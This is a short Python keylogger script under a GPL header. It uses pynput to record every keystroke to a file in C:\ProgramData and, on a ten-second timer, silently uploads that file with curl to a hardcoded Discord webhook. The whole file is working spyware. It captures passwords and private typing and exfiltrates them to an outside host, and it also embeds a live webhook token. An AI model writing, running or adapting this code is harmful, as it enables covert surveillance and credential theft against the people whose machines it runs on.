#!/usr/bin/python3

"""
  Copyright (C) 2021-2022, Loubaris

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You must obey the GNU General Public License. If you will modify
  this file(s), you may extend this exception to your version
  of the file(s), but you are not obligated to do so.  If you do not
  wish to do so, delete this exception statement from your version.
  If you delete this exception statement from all source files in the
  program, then also delete it here.

  Contact:

          Mail: adamou.loubaris@gmail.com

"""

import os
from datetime import date
import threading
import pynput
from pynput.keyboard import Key, Listener
today = date.today()
keys = []
webhook="https://discord.com/api/webhooks/1005206827253891143/ggfzN-HlM8K7Et0-CPMRZYH7TgjWk6BkwUgfJP8WtlSNZ0FycWlLUlZ2uGbAzPoOTery"
def sendwebhook():
    threading.Timer(10, sendwebhook).start()
    os.system(f"""curl --silent --output /dev/null -F ss=@"C:\\ProgramData\\temporary.txt" {webhook}""")
  
def on_press(key):
    keys.append(key)
    write_file(f"KeyloggerPy | {today}\n\n")
    write_file(keys)

          
def write_file(keys):
    with open('C:\\ProgramData\\temporary.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
                     

            f.write(' ')
              
def on_release(key):           
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

sendwebhook()
  
with Listener(on_press = on_press,
              on_release = on_release) as listener:               
    listener.join()